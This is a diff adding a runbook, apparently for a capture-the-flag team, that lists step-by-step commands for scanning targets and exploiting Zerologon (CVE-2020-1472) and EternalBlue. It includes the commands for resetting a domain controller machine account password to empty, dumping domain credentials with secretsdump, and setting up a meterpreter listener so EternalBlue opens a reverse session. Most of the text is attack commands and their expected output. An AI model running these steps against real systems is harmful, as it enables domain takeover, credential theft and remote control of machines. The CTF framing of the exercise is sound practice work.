@@ -1,0 +1,51 @@
+For the actual CTF, most these commands will be scripted. For the first test however we need:
+
+- execute exploit scripts locally
+- execute scan scripts locally
+- a meterpreter session to exploit eternalblue, this will likely stay manual
+- Likely to be bugs in my code and external untested code
+
+
+1) Install dependancies:
+
+cd into CTF_Blue_teaming:
+`cd CTF_Blue_teaming`
+`python3 command.py install_zerologon`
+`pip install python-libnmap`
+
+2) Run scans
+
+I need to see the outputs of this initially. I think terminal will be noisy but doesn't matter too much
+
+python3 scanning Scanner.py
+
+this will take a while...... in testing the port scan took 30 minutes which amazed me. it's on -T4!!
+
+going to need to manually inspect json outputs and the SMB xml file
+
+ZEROLOGON
+
+python3 exploits/zerologon/impacket/examples/secretsdump.py -just-dc -no-pass hostname\$@ipaddress
+should return:
+RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+
+python3 exploits/zerologon/CVE-2020-1472/cve-2020-1472-exploit.py hostname ip
+
+Target vulnerable, changing account password to empty string
+Result: 0
+Exploit complete!
+
+python3 exploits/zerologon/impacket/examples/secretsdump.py -just-dc -no-pass hostname\$@ipaddress
+should return domain credentials
+
+ETERNALBLUE
+
+see if the smb xml file has named pipes, add them to target.json file, if not, uh oh.
+
+will pull json file from vulnerable_targets dir
+
+first see payloads/meterpreter_commands to set up a listener!
+
+python3 exploits/eternal/EternalBlue.py
+
+should see a session open up back on our listener, go back to listener and payloads/meterpreter_commands
